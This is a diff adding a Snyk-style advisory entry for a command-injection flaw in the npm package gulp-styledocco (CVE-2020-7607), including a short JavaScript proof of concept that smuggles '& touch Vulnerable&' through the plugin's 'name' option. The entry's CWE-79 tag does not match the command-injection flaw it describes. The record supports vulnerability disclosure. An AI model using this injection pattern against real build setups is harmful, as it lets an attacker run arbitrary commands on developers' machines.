@@ -1,0 +1,27 @@
+---
+- id: snykio:npm:gulp-styledocco:560126
+  title: Command Injection
+  description: "[gulp-styledocco][1] is a StyleDocco plugin for gulp.\n\nAffected
+    versions of this package are vulnerable to Command Injection.\nThe argument `options`
+    of the exports function in `index.js` can be\ncontrolled by users without any
+    sanitization.\n\n### PoC   {#poc}\n\n    var root = require(\"gulp-styledocco\");\n
+    \   var gulp = require(\"gulp\");\n    var options = {\n      opt: 'docs',\n      name:
+    \"123\\\"& touch Vulnerable& \\\"\"\n    }\n    \n    gulp.src(\"./gulp-styledocco.js\")\n
+    \     .pipe(root(options));\n\n\n\n[1]: https://www.npmjs.com/package/gulp-styledocco\n"
+  affected_package: gulp-styledocco
+  vulnerable_versions:
+  - "*"
+  severity: medium
+  package_manager: npm
+  cve:
+  - CVE-2020-7607
+  cwe:
+  - CWE-79
+  disclosed_date: 2020-03-13
+  created_date: 2020-03-13
+  last_modified_date: 2020-03-13
+  credit:
+  - JHU System Security Lab
+  references:
+  - https://github.com/konitter/gulp-styledocco/blob/master/index.js#L72
+  source_url: https://snyk.io/vuln/SNYK-JS-GULPSTYLEDOCCO-560126
